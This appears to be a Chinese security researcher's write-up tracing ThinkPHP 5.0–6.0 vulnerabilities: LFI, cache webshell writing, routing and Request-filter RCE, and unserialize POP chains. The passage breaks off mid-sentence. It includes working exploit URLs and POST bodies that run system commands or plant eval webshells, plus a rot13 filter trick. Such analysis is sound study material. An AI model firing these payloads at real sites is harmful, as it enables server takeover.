首先输入由assign()函数处理。我们一路跟到View类的assign()函数。 123456789public function assign($name, $value = '')&#123; if (is_array($name)) &#123; $this-&gt;data = array_merge($this-&gt;data, $name); &#125; else &#123; $this-&gt;data[$name] = $value; &#125; return $this;&#125; 看到我们传入的数据直接保存到view的$this-&gt;data接下来调用fetch.我们同样一路跟到View类的fetch中。 123456789101112131415161718192021222324252627public function fetch($template = '', $vars = [], $replace = [], $config = [], $renderContent = false)&#123; // 模板变量 $vars = array_merge(self::$var, $this-&gt;data, $vars); // 页面缓存 ob_start(); ob_implicit_flush(0); // 渲染输出 try &#123; $method = $renderContent ? 'display' : 'fetch'; // 允许用户自定义模板的字符串替换 $replace = array_merge($this-&gt;replace, $replace, (array) $this-&gt;engine-&gt;config('tpl_replace_string')); $this-&gt;engine-&gt;config('tpl_replace_string', $replace); $this-&gt;engine-&gt;$method($template, $vars, $config); &#125; catch (\\Exception $e) &#123; ob_end_clean(); throw $e; &#125; // 获取并清空缓存 $content = ob_get_clean(); // 内容过滤标签 Hook::listen('view_filter', $content); return $content;&#125; 这里很快会发现实际调用的是$this-&gt;engine-&gt;$method($template, $vars, $config);.而$method此处为fetch,$vars为我们可控的传入变量。接下来由模板引擎处理我们的变量 1234567891011121314public function fetch($template, $data = [], $config = [])&#123; if ('' == pathinfo($template, PATHINFO_EXTENSION)) &#123; // 获取模板文件名 $template = $this-&gt;parseTemplate($template); &#125; // 模板不存在 抛出异常 if (!is_file($template)) &#123; throw new TemplateNotFoundException('template not exists:' . $template, $template); &#125; // 记录视图信息 App::$debug &amp;&amp; Log::record('[ VIEW ] ' . $template . ' [ ' . var_export(array_keys($data), true) . ' ]', 'info'); $this-&gt;template-&gt;fetch($template, $data, $config);&#125; 注意到如果$template对应的路径文件不存在的话直接报错了。所以这个lfi洞的前提还得需要我们环境代码中存在当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html。如果这里没报错即进入template的fetch.看到$vars被赋给data.而马上下面storage调用了read函数。里面存在extract这样的变量覆盖代码。并且直接includecacheFile。 也就是说,$cacheFile可以被变量覆盖。达成lfi。 官方的修复方法是通过将$cacheFile 变量存储在 $this-&gt;cacheFile 中.防止变量覆盖。 tp5.0-rceIndex.php配置 1234567891011&lt;?phpnamespace app\\index\\controller;use think\\Cache;class Index&#123; public function index() &#123; Cache::set(\"name\",input(\"get.username\")); return 'Cache success'; &#125;&#125; payload 1http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;?username&#x3D;byc_404%0d%0a@eval($_GET[_]);&#x2F;&#x2F; 上面的payload将把一句话webshell写入缓存文件。访问对应路径即可。 这个用例其实跟以前ichunqiu平台上一道thinkphp二次开发的模板缓存文件getshell很相似。这里来跟进下源码 12345678910111213141516171819202122public static function set($name, $value, $expire = null)&#123; self::$writeTimes++; return self::init()-&gt;set($name, $value, $expire);&#125;......public static function init(array $options = [])&#123; if (is_null(self::$handler)) &#123; // 自动初始化缓存 if (!empty($options)) &#123; $connect = self::connect($options); &#125; elseif ('complex' == Config::get('cache.type')) &#123; $connect = self::connect(Config::get('cache.default')); &#125; else &#123; $connect = self::connect(Config::get('cache')); &#125; self::$handler = $connect; &#125; return self::$handler;&#125; 这里init()函数主要是实例化了一个handler对象。此处为默认值File类。那么前往cache/driver/File类看下.此处File类的set方法如下 123456789101112131415161718192021222324public function set($name, $value, $expire = null)&#123; if (is_null($expire)) &#123; $expire = $this-&gt;options['expire']; &#125; $filename = $this-&gt;getCacheKey($name); if ($this-&gt;tag &amp;&amp; !is_file($filename)) &#123; $first = true; &#125; $data = serialize($value); if ($this-&gt;options['data_compress'] &amp;&amp; function_exists('gzcompress')) &#123; //数据压缩 $data = gzcompress($data, 3); &#125; $data = \"&lt;?php\\n//\" . sprintf('%012d', $expire) . $data . \"\\n?&gt;\"; $result = file_put_contents($filename, $data); if ($result) &#123; isset($first) &amp;&amp; $this-&gt;setTagItem($filename); clearstatcache(); return true; &#125; else &#123; return false; &#125;&#125; 可以看到。数据$value经由序列化后被拼接到含有php代码块的语句中。之后执行file_put_contents.符合我们写入shell的用法。因此只需注意使用换行符bypass前面的注释符即可。 当然这个写shell rce的方法比较尴尬。因为文件名可以看到由getCacheKey决定。其文件名生成方式如下：先计算键名md5值。再取前两位为目录。后30位为文件名。我们这里是因为提前设定好了Index.php中键名为name.所以可以计算文件名b0/68931cc450442b63f5b3d276ea4297.php。但是实际中如果没有源码泄露无法得知键名。也就没法计算shell的路径。 当然。在反序列化pop链中我们利用这个File类关于文件名可控的问题就大不一样了。具体后面再说。 tp5.*-rce-get比较出名的rce洞。影响版本5.0.7&lt;=ThinkPHP5&lt;=5.0.22 、5.1.0&lt;=ThinkPHP&lt;=5.1.30。5.1.x版本的payload有 12345?s&#x3D;index&#x2F;\\think\\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd?s&#x3D;index&#x2F;\\think\\view\\driver\\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;?s&#x3D;index&#x2F;\\think\\template\\driver\\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;?s&#x3D;index&#x2F;\\think\\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id?s&#x3D;index&#x2F;\\think\\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id 5.0.* 1234?s&#x3D;index&#x2F;think\\config&#x2F;get&amp;name&#x3D;database.username # 获取配置信息?s&#x3D;index&#x2F;\\think\\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg # 包含任意文件?s&#x3D;index&#x2F;\\think\\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php # 包含任意.php文件?s&#x3D;index&#x2F;\\think\\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id 首先起因可以从config/app.php中看到。默认情况下var_pathinfo为s.url_route_must为false 显然此时我们可以任意调用控制器。thinkphp中的流程是http://site/?s=模块/控制器/方法 在重要代码controller处下断点（此处也是5.1.30后高版本官方修改的部分。说明原代码存在问题）payload 1?s&#x3D;index&#x2F;\\think\\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;whoami 自动跟随debug调用函数跟进。开始在controller这可以看见$result变量是存储了我们传入的值的数组。其值分别为index,\\think\\Request,input.一路跟下去会发现执行代码的关键位置在thinkphp\\library\\think\\route\\dispatch\\Module.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253public function exec()&#123; // 监听module_init $this-&gt;app['hook']-&gt;listen('module_init'); try &#123; // 实例化控制器 $instance = $this-&gt;app-&gt;controller($this-&gt;controller, $this-&gt;rule-&gt;getConfig('url_controller_layer'), $this-&gt;rule-&gt;getConfig('controller_suffix'), $this-&gt;rule-&gt;getConfig('empty_controller')); &#125; catch (ClassNotFoundException $e) &#123; throw new HttpException(404, 'controller not exists:' . $e-&gt;getClass()); &#125; $this-&gt;app['middleware']-&gt;controller(function (Request $request, $next) use ($instance) &#123; // 获取当前操作名 $action = $this-&gt;actionName . $this-&gt;rule-&gt;getConfig('action_suffix'); if (is_callable([$instance, $action])) &#123; // 执行操作方法 $call = [$instance, $action]; // 严格获取当前操作方法名 $reflect = new ReflectionMethod($instance, $action); $methodName = $reflect-&gt;getName(); $suffix = $this-&gt;rule-&gt;getConfig('action_suffix'); $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName; $this-&gt;request-&gt;setAction($actionName); // 自动获取请求变量 $vars = $this-&gt;rule-&gt;getConfig('url_param_type') ? $this-&gt;request-&gt;route() : $this-&gt;request-&gt;param(); &#125; elseif (is_callable([$instance, '_empty'])) &#123; // 空操作 $call = [$instance, '_empty']; $vars = [$this-&gt;actionName]; $reflect = new ReflectionMethod($instance, '_empty'); &#125; else &#123; // 操作不存在 throw new HttpException(404, 'method not exists:' . get_class($instance) . '-&gt;' . $action . '()'); &#125; $this-&gt;app['hook']-&gt;listen('action_begin', $call); $data = $this-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars); return $this-&gt;autoResponse($data); &#125;); return $this-&gt;app['middleware']-&gt;dispatch($this-&gt;request, 'controller');&#125; 仔细一看其实就是调用了反射方法。用$this-&gt;controller,$this-&gt;actionName.因为之前我们知道Request 类的input函数会对输入执行call_user_func操作。因此最后执行了call_user_func(&#39;system&#39;,&#39;whoami&#39;)因此官方最后的修复是针对输入控制器名进行过滤^[A-Za-z](\\w)*$ tp-5.*-rce-post首先这个rce版本5.0.*应该是小于5.0.24的。所以用一个5.0.23版本的实验下。 首先payload 12POST &#x2F;?s&#x3D;index&#x2F;index HTTP&#x2F;1.1_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;whoami 这里因为我的Index.php是之前实验ifi时的。所以index/index路由返回Cache Success.实际上s只需要赋给一个存在method的控制器即可。 下面来跟下源码。首先从官方commit修改处可以看出原先代码中this-&gt;$method变量来自可控数据$_POST 123if (isset($_POST[Config::get('var_method')])) &#123; $this-&gt;method = strtoupper($_POST[Config::get('var_method')]); $this-&gt;&#123;$this-&gt;method&#125;($_POST); 那么我们就可以调用Request类的method了。看到payload中存在__construct。自然看向构造方法 1234567891011121314protected function __construct($options = [])&#123; foreach ($options as $name =&gt; $item) &#123; if (property_exists($this, $name)) &#123; $this-&gt;$name = $item; &#125; &#125; if (is_null($this-&gt;filter)) &#123; $this-&gt;filter = Config::get('default_filter'); &#125; // 保存 php://input $this-&gt;input = file_get_contents('php://input');&#125; 这个foreach明显存在配置覆盖的写法。这里继续下断点一路跟发现会根据app_debug的值前往当前类下param方法。而这个方法全都走input方法。也就是都会调用了call_user_func。具体可以看这张图 前面提到我们可以覆盖属性。这里主要就是覆盖filter跟server。因为method方法中是取的我们传入的this-&gt;server[&#39;REQUEST_METHOD&#39;]的值。所以覆盖为whoami后作为参数被送到input.input又因为filtervalue方法调用call_user_func。直接利用覆盖的system作为fliter值即可。最后到达call_user_func rce tp5.0.x-unserialize这一部分主要是跟下tp5.0版本的反序列化pop链。不过这里不会分享exp.(网上跟先知应该都能很方便找到)。如果需要的话自己SCTF2020wp里有绕过短标签的exp。以及以前跟php框架有几个其他的exp可以自行寻找。当然我记得wh1t3P1g大佬自己把tp的popchain集成到phpggc中了。也可以自动生成。 然后就是windows下写文件的方法。目前能够在php7以前的版本写shell exp是有的。但php7的windows写shell我还没成功过。理论上windows不能成功的原因只是因为文件名不允许&lt;,?的。但是如果用过滤器绕过的话应该是没问题的……php5.4.45+windows 成功写入phpinfo() (关闭短标签) 这里我就直接跟下linux的payload吧。首先是入口点。肯定是找__destruct函数。不难发现一共只有几个可用。我们找到 library\\think\\process\\pipes下windows.php。发现其调用了$this-&gt;removeFiles.而removeFiles又调用了file_exists可以触发__toString方法。 123456789private function removeFiles()&#123; foreach ($this-&gt;files as $filename) &#123; if (file_exists($filename)) &#123; @unlink($filename); &#125; &#125; $this-&gt;files = [];&#125; ps.关于file_exists可以触发__toString自己以前还没有注意过。具体不妨去l3m0n师傅这篇文章下评论看看。(应该是因为file_exists接受字符串参数,而只要对象被当做字符串即会触发__toString)全局继续找toString.也只有几个选择。这里找到 think\\Model.php.它调用了toJson。而toJson继续调用了toArray. 1234public function toJson($options = JSON_UNESCAPED_UNICODE)&#123; return json_encode($this-&gt;toArray(), $options);&#125; 同时注意这里Model类是抽象类。所以实际编写exp时我们必须用它的子类。比如此处的Pivot。我们直接来到toArray。这里首先主要看有没有可以触发__call的情况。5.0.24版本下应该又三处都是可以满足的 123$relation = $this-&gt;getAttr($key);$value = $this-&gt;getRelationData($modelRelation);$item[$key] = $value ? $value-&gt;getAttr($attr) : null; 与其说是找触发__call的。不如说是找可用方法。多数情况下这些方法基本利用不了。但是如果满足this-&gt;xxx($var)或者进一步可控类-&gt;xxx(可控变量)。我们就能找任意类的__call进行进一步挖掘。这也是pop链中call方法经常用到的原因之一。 为了了解我们如何控制这一步用来调用__call。我们先放一下全局找__call的过程。来选择一个触发方式。对于$item[$key] = $value ? $value-&gt;getAttr($attr) : null;这里看看$value与$attr依次是怎么被赋值的。value 123$relation = Loader::parseName($name, 1, false);$modelRelation = $this-&gt;$relation();$value = $this-&gt;getRelationData($modelRelation); 主要是对$name调用parseName。而$name来自可控数组$this-&gt;append。也就是说。$modelrelation是Model这个类任意方法的返回值。(.$relation())。所以找一个直接返回可控数据的方法即可。比如getError 1234public function getError()&#123; return $this-&gt;error;&#125; 回到上面。现在我们继续跟进getRelationData 1234567891011121314protected function getRelationData(Relation $modelRelation)&#123; if ($this-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)) &#123; $value = $this-&gt;parent; &#125; else &#123; // 首先获取关联数据 if (method_exists($modelRelation, 'getRelation')) &#123; $value = $modelRelation-&gt;getRelation(); &#125; else &#123; throw new BadMethodCallException('method not exists:' . get_class($modelRelation) . '-&gt; getRelation'); &#125; &#125; return $value;&#125; 首先它接收的参数是Relation类的。所以我们上面返回的结果$this-&gt;error肯定也是一个Relation的对象了。（Relation也是抽象类。所以实例化时要用它的子类）然后此处我们自然要走第一个if分支来控制返回值。分别看下isSelfRelation()跟getModel()发现都只是简单返回this-&gt;relation与this-&gt;query-&gt;model()。全部可控。那只剩下让get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)成立了。意思就是$modelRelation-&gt;getModel()和$this-&gt;parent为同类，也就是要求$value-&gt;getAttr($attr)中的$value和上面可控的model为同类那么现在$value-&gt;getAttr($attr)的value跟完了。我们来看看$attr 1234$bindAttr = $modelRelation-&gt;getBindAttr();if ($bindAttr) &#123; foreach ($bindAttr as $key =&gt; $attr) ...... 上面提到过，modelRelation因为取自可控方法所以是任意值。我们直接全局找getBindAttr方法。只有一个接口类:Relation的子类OnetoOne 1234public function getBindAttr()&#123; return $this-&gt;bindAttr;&#125; 数据可控。不过OnetoOne是抽象类。所以继续找子类。这里就只有两个子类。我们选择HasOne. 现在。我们做到了任意调用__call。剩下的就是找可用的__call。 那么全局找可用的__call。此处可以找到think\\console\\Output 类。 12345678910111213public function __call($method, $args)&#123; if (in_array($method, $this-&gt;styles)) &#123; array_unshift($args, $method); return call_user_func_array([$this, 'block'], $args); &#125; if ($this-&gt;handle &amp;&amp; method_exists($this-&gt;handle, $method)) &#123; return call_user_func_array([$this-&gt;handle, $method], $args); &#125; else &#123; throw new Exception('method not exists:' . __CLASS__ . '-&gt;' . $method); &#125;&#125; 那么首先上面触发点里$this-&gt;parent肯定是要传Output类的实例了。下面看这里的$this-&gt;block() 1234567891011121314protected function block($style, $message)&#123; $this-&gt;writeln(\"&lt;&#123;$style&#125;&gt;&#123;$message&#125;&lt;/$style&gt;\");&#125;public function writeln($messages, $type = self::OUTPUT_NORMAL)&#123; $this-&gt;write($messages, true, $type);&#125;public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)&#123; $this-&gt;handle-&gt;write($messages, $newline, $type);&#125; 调用的是$this-&gt;handle-&gt;write。既然$this-&gt;handle可控,那么此处找一个同名的write方法。我们全局搜索找到Memcached类 1234public function write($sessID, $sessData)&#123; return $this-&gt;handler-&gt;set($this-&gt;config['session_name'] . $sessID, $sessData, $this-&gt;config['expire']);&#125; 同理。还是可以全局找set方法。第一个就是我们曾经在tp5RCE中见到的File类 123456789101112131415161718192021222324252627public function set($name, $value, $expire = null)&#123; if (is_null($expire)) &#123; $expire = $this-&gt;options['expire']; &#125; if ($expire instanceof \\DateTime) &#123; $expire = $expire-&gt;getTimestamp() - time(); &#125; $filename = $this-&gt;getCacheKey($name, true); if ($this-&gt;tag &amp;&amp; !is_file($filename)) &#123; $first = true; &#125; $data = serialize($value); if ($this-&gt;options['data_compress'] &amp;&amp; function_exists('gzcompress')) &#123; //数据压缩 $data = gzcompress($data, 3); &#125; $data = \"&lt;?php\\n//\" . sprintf('%012d', $expire) . \"\\n exit();?&gt;\\n\" . $data; $result = file_put_contents($filename, $data); if ($result) &#123; isset($first) &amp;&amp; $this-&gt;setTagItem($filename); clearstatcache(); return true; &#125; else &#123; return false; &#125;&#125; 之前曾经说过rce时缓存文件名不可控。但是在反序列化中就不存在这个问题。 1234567891011121314151617181920$filename = $this-&gt;getCacheKey($name, true);protected function getCacheKey($name, $auto = false)&#123; $name = md5($name); if ($this-&gt;options['cache_subdir']) &#123; // 使用子目录 $name = substr($name, 0, 2) . DS . substr($name, 2); &#125; if ($this-&gt;options['prefix']) &#123; $name = $this-&gt;options['prefix'] . DS . $name; &#125; $filename = $this-&gt;options['path'] . $name . '.php'; $dir = dirname($filename); if ($auto &amp;&amp; !is_dir($dir)) &#123; mkdir($dir, 0755, true); &#125; return $filename;&#125; 文件名来自$filename = $this-&gt;options[&#39;path&#39;] . $name . &#39;.php&#39;;.可控。我们再看文件内容如何控制。 1$data = \"&lt;?php\\n//\" . sprintf('%012d', $expire) . \"\\n exit();?&gt;\\n\" . $data; 这里就是pop链最大的难点了。$data其实并不可控。具体可以回溯到我刚刚上面放的一连串调用write方法的源码处。注意到 1234public function writeln($messages, $type = self::OUTPUT_NORMAL)&#123; $this-&gt;write($messages, true, $type);&#125; write第二个参数是写死的true。它会一路传到File类作为$data写入。那么我们写文件等于控制不了写入内容。 但是没有关系。set在这个file_put_contents下还调用了一个函数setTagItem 123456789101112131415protected function setTagItem($name)&#123; if ($this-&gt;tag) &#123; $key = 'tag_' . md5($this-&gt;tag); $this-&gt;tag = null; if ($this-&gt;has($key)) &#123; $value = explode(',', $this-&gt;get($key)); $value[] = $name; $value = implode(',', array_unique($value)); &#125; else &#123; $value = $name; &#125; $this-&gt;set($key, $value, 0); &#125;&#125; 在这里我们又一次调用了set。并且两个参数全部可控。所以最后循环调用我们就知道,写入文件的文件名为md5(&#39;tag_&#39; . md5($this-&gt;tag)).&#39;.php&#39;。内容为$data = &quot;&lt;?php\\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data; 当然。这里显然存在一个绕过死亡exit的问题。使用rot13即可。然后rot13的payload绕不过默认的短标签。所以会需要加过滤器组合拳。除了常见的base64，WMCTF中使用到其他的iconv或者其他组合也是可行的。原理不再赘述那么。控制payload只要控制File类$this-&gt;options[&#39;path&#39;] = php://filter/write=string.rot13/resource=&lt;?cuc @riny($_TRG[_]);?&gt;即可。 执行exp打的话。会发现存在两个文件。这是上面我们调用了两次set的缘故。而文件名由我们的$tag决定。具体计算方法也在上面提及了。当然最好的方法永远是本地自己打一遍。这样才能确信文件名这种远程不可见的东西。 另外我相信大家肯定发现这个pop链有个变招。那就是linux,windows通用的写目录。回到上面getCacheKey 12345$dir = dirname($filename);if ($auto &amp;&amp; !is_dir($dir)) &#123;mkdir($dir, 0755, true);&#125; 只要把$this-&gt;options[&#39;path&#39;]设置为目录的话。直接可以写755权限目录。 SCTF2020 考察tp5.024那道题当时使用了python脚本高强度删文件。导致我以为当前目录不可写。但是换成写目录的payload后发现可以创建目录。并且可以存在相同于靶机重启时间的3分钟。所以使用这种payload黑盒探测不失为一种办法。 tp5.1.x-unserialize今天来跟下5.1的pop链。相比5.0而言思路大致相同。只有几个类的区别。并且其exp已经集成到phpggc上了。 还是从起点开始看。跟昨天5.0的链子是一样的。从Windows类开始。然后=&gt;file_exists =&gt; toString()。然后接着全局搜索。此处利用Conversion的toString() =&gt; __toJson() =&gt; toArray()而不是5.0中的Model类 看到thinkphp\\library\\think\\model\\concern\\Conversion.php中的toArray() .我们同样寻找可以触发__call()的代码 此处主要是$relation-&gt;visible($name)会触发__call.选择这一处的代码是因为,relation来自$this-&gt;getRelation($key).$name来自$this-&gt;append.看到getRelation 123456789public function getRelation($name = null)&#123; if (is_null($name)) &#123; return $this-&gt;relation; &#125; elseif (array_key_exists($name, $this-&gt;relation)) &#123; return $this-&gt;relation[$name]; &#125; return;&#125; 我们要进入visble的分支。必须要$relation为空。所以$this-&gt;relation直接置空即可。 此时$relation由$relation = $this-&gt;getAttr($key);决定。它会依次调用\\thinkphp\\library\\think\\model\\concern\\Attribute.php 的getAttr()与getData() 12345678910111213141516171819 public function getAttr($name, &amp;$item = null)&#123; try &#123; $notFound = false; $value = $this-&gt;getData($name); &#125; catch (InvalidArgumentException $e) &#123; ......public function getData($name = null)&#123; if (is_null($name)) &#123; return $this-&gt;data; &#125; elseif (array_key_exists($name, $this-&gt;data)) &#123; return $this-&gt;data[$name]; &#125; elseif (array_key_exists($name, $this-&gt;relation)) &#123; return $this-&gt;relation[$name]; &#125; throw new InvalidArgumentException('property not exists:' . static::class . '-&gt;' . $name);&#125; 这样就能确认我们的$relation来自Attribute类的$this-&gt;data[$name]. 现在需要注意的是。我们必须得找到一个既能调用Conversion还能调用Attribute属性的类。即继承了Attribute类和Conversion类的子类。这个其实就是我们之前5.0链子中用过的Model.php。加上Model是抽象类。所以编写exp中使用它的子类Pivot实例化。这点不必多说。 接下来看$relation-&gt;visible($name)中的$name.它是遍历$this-&gt;append得到的。可控。只需注意将其赋值为数组即可。(因为要进入if (is_array($name))的分支) 既然已经拥有触发__call的条件了。我们现在找一个可用的__call。5.1版本中的gadget就是来自Request类的__call。 123456789public function __call($method, $args)&#123; if (array_key_exists($method, $this-&gt;hook)) &#123; array_unshift($args, $this); return call_user_func_array($this-&gt;hook[$method], $args); &#125; throw new Exception('method not exists:' . static::class . '-&gt;' . $method);&#125; 显然$this-&gt;hook可以让我们控制为[&quot;visable&quot;-&gt;&quot;arbitrary method&quot;]这个数组任意调用方法。但是注意array_unshift($args, $this)会强行把$this放到$args数组的第一位。其后果是怎样的呢？我们看下call_user_func_array 123call_user_func_array([$obj,\"arbitrary method\"],[$this,$arg])=&gt;$obj-&gt;$func($this,$argv) 这种方法执行几乎没有。所以这就限制我们要找一个不受这种调用方式影响的函数。 在以前tp5的漏洞分析中,曾经用到过think\\Request类中的input 方法。里面有call_user_func($filter,$data)可以用于命令执行。但是前面说过， $args 数组变量的第一个元素，是一个固定死的类对象，所以这里我们不能直接调用 input 方法，而应该寻找调用 input 的方法。 整个Request类中一共有7处调用input方法的其他方法。我们选择param方法为例 1234567891011121314151617181920212223242526272829303132333435public function param($name = '', $default = null, $filter = '')&#123; if (!$this-&gt;mergeParam) &#123; $method = $this-&gt;method(true); // 自动获取请求变量 switch ($method) &#123; case 'POST': $vars = $this-&gt;post(false); break; case 'PUT': case 'DELETE': case 'PATCH': $vars = $this-&gt;put(false); break; default: $vars = []; &#125; // 当前请求参数和URL地址中的参数合并 $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false)); $this-&gt;mergeParam = true; &#125; if (true === $name) &#123; // 获取包含文件上传信息的数组 $file = $this-&gt;file(); $data = is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param; return $this-&gt;input($data, '', $default, $filter); &#125; return $this-&gt;input($this-&gt;param, $name, $default, $filter);&#125; 调用了input方法但是只有一个$param是可控的。所以还要继续找调用param的方法。 12345678910111213public function isAjax($ajax = false)&#123; $value = $this-&gt;server('HTTP_X_REQUESTED_WITH'); $result = 'xmlhttprequest' == strtolower($value) ? true : false; if (true === $ajax) &#123; return $result; &#125; $result = $this-&gt;param($this-&gt;config['var_ajax']) ? true : $result; $this-&gt;mergeParam = false; return $result;&#125; isAjax方法返回值由$this-&gt;config[&#39;var_ajax&#39;]控制。那么等于控制了param的参数$name.等于控制了input 的参数$name. 最后再来到input方法这看调用。 123456789101112131415161718192021222324252627282930313233343536373839404142434445public function input($data = [], $name = '', $default = null, $filter = '')&#123; if (false === $name) &#123; // 获取原始数据 return $data; &#125; $name = (string) $name; if ('' != $name) &#123; // 解析name if (strpos($name, '/')) &#123; list($name, $type) = explode('/', $name); &#125; $data = $this-&gt;getData($data, $name); if (is_null($data)) &#123; return $default; &#125; if (is_object($data)) &#123; return $data; &#125; &#125; // 解析过滤器 $filter = $this-&gt;getFilter($filter, $default); if (is_array($data)) &#123; array_walk_recursive($data, [$this, 'filterValue'], $filter); if (version_compare(PHP_VERSION, '7.1.0', '&lt;')) &#123; // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针 $this-&gt;arrayReset($data); &#125; &#125; else &#123; $this-&gt;filterValue($data, $name, $filter); &#125; if (isset($type) &amp;&amp; $data !== $default) &#123; // 强制类型转换 $this-&gt;typeCast($data, $type); &#125; return $data;&#125; getData顺着看一下可控。且$data=$data[$name],$filter来自$this-&gt;filter.最后到了array_walk_resursive相当于直接对数组每一个值调用了回调函数$this-&gt;filterValue($filter)。 12if (is_array($data)) &#123; array_walk_recursive($data, [$this, 'filterValue'], $filter); $this-&gt;filterValue是通过call_user_func执行的自然不必说了。既然如此。控制$this-&gt;filter为system,$data数组第一个值为命令whoami之类的就可以执行命令了。 至此pop链就完整了。其实中间有个步骤就是解决call_user_func_array那找到不受定死参数影响的命令执行这块,主要思路就是利用thinkphp过滤器,覆盖filter的方法去执行代码。而在找到input作为主要下手点时,call_user_func_array(array(任意类,任意方法),$args) 中 $args 数组的第一个变量，即我们前面说的一个固定死的类对象会作为 $data 传给 input 方法，那么在强转成字符串的时候，框架就会报错退出。所以我们找不到就继续找上层调用input的函数。直到找到可控参数的函数isAjax.就能解决参数不可控的问题。 tp5.2.x-unserialize5.2版本的链子貌似跟之前没啥区别。但是我composer一直安装不上。加上5.2版本作为dev版本本身出现的不多,所以这里用thinkphp-vuln里的例子简单提一下。 前面入手点大同小异。唯一有区别的地方在触发__call的代码$relation-&gt;visible($name)这。看似tp5.2已经把这句代码删了。但是实际上是被转移到了appendAttrToArray这个方法中。因此基本没有区别。我就不跟了。 放上几张图 真正的执行点在下面的$closure($value,$this-&gt;data)这里的动态调用。参数均可控。所以赋值命令执行的参数即可。 tp6.0.x-unserialize今天重新看了下之前在 php框架反序列化练习 文章里的内容。才想起来5.2跟6.0的链子应该是跟过了。不过当时没有动态调试,理解也没那么深刻。所以还是再看一下。 还是老样子更改Index.php 1234567891011&lt;?phpnamespace app\\controller;class Index&#123; public function index() &#123; $u = unserialize($_GET['c']); return 'ThinkPHP V6.x'; &#125;&#125; 直接用wh1t3p1g 师傅集成好的。顺带也推荐下师傅在安全客上针对thinkphp链子的分析文章。 首先6.0版本的主要问题是前面5.*版本的利用起点Windows类都没了。也就是少了一个__destruct()。那么我们需要找到一个替代的__destruct作为起点。并且最好它能够在中间某个环节起到与其他链子相同作用比如触发__call,__toString之类的。这样的逻辑也是第5空间laravel那题的解题思路吧。因为跟过链子的人都知道只需要两个类就能rce.既然其中一个destruct被处理了。找一个替代的自然是最简单的办法。 vendor/topthink/think-orm/src/Model.php 123456public function __destruct()&#123; if ($this-&gt;lazySave) &#123; $this-&gt;save(); &#125;&#125; 构造lazySave为真值。进入save函数 12345678910111213141516171819202122232425public function save(array $data = [], string $sequence = null): bool&#123; // 数据对象赋值 $this-&gt;setAttrs($data); if ($this-&gt;isEmpty() || false === $this-&gt;trigger('BeforeWrite')) &#123; return false; &#125; $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence); if (false === $result) &#123; return false; &#125; // 写入回调 $this-&gt;trigger('AfterWrite'); // 重新记录原始数据 $this-&gt;origin = $this-&gt;data; $this-&gt;set = []; $this-&gt;lazySave = false; return true;&#125; 这里关键函数是updateData.不过既然如此我们不能进入上面那个if分支。isEmpty与trigger 123456789101112public function isEmpty(): bool&#123; return empty($this-&gt;data);&#125;protected function trigger(string $event): bool&#123; if (!$this-&gt;withEvent) &#123; return true; &#125; ...... 显然。需要1.$this-&gt;data为非空数组。2.$this-&gt;withEvent为false3.$this-&gt;exists为true进入updateData函数 跟进到updateData后。我们不妨先看下哪一个函数可以利用,再回头考虑参数的构造。这里顺着看到checkAllowFields后 1$table = $this-&gt;table ? $this-&gt;table . $this-&gt;suffix : $query-&gt;getTable(); 存在可控变量的拼接。那么我们就可以触发__toString了。在经历了前面几个版本的反序列化构造后，我们当然清楚tp5.1~5.2版本的链子分别是__destruct()=&gt; __toString() =&gt; __call() =&gt; call_user_func_array / $closure($value,$this-&gt;data)的一系列调用。那么此处我们自然可以继续达成__toString来延续链子。 回头再检查updateData这的参数需要。首先第一个trigger我们已经满足条件了。然后if (empty($data))这个分支不能进入。那就要看向getChangedData 12345678910111213141516171819public function getChangedData(): array&#123; $data = $this-&gt;force ? $this-&gt;data : array_udiff_assoc($this-&gt;data, $this-&gt;origin, function ($a, $b) &#123; if ((empty($a) || empty($b)) &amp;&amp; $a !== $b) &#123; return 1; &#125; return is_object($a) || $a != $b ? 1 : 0; &#125;); // 只读字段不允许更新 foreach ($this-&gt;readonly as $key =&gt; $field) &#123; if (isset($data[$field])) &#123; unset($data[$field]); &#125; &#125; return $data;&#125; 令$this-&gt;force为true.然后data就可控了。 接下来是回到利用函数checkAllowFields.拼接处之前的代码 12345if (empty($this-&gt;field)) &#123; if (!empty($this-&gt;schema)) &#123; $this-&gt;field = array_keys(array_merge($this-&gt;schema, $this-&gt;jsonType)); &#125; else &#123; $query = $this-&gt;db(); 需要1.$this-&gt;field为空进入分支2.$this-&gt;schema为空进入else 看一眼db() 123456public function db($scope = []): Query&#123; /** @var Query $query */ $query = self::$db-&gt;connect($this-&gt;connection) -&gt;name($this-&gt;name . $this-&gt;suffix) -&gt;pk($this-&gt;pk); 原来db()函数这里也有一个变量拼接……不过殊途同归。我们用哪一个都差不多。例如exp中链子是把$this-&gt;suffix作为触发的对象的。 然后后面就是一路畅通了。这里跟5.1(注意不是5.0,5.0 的 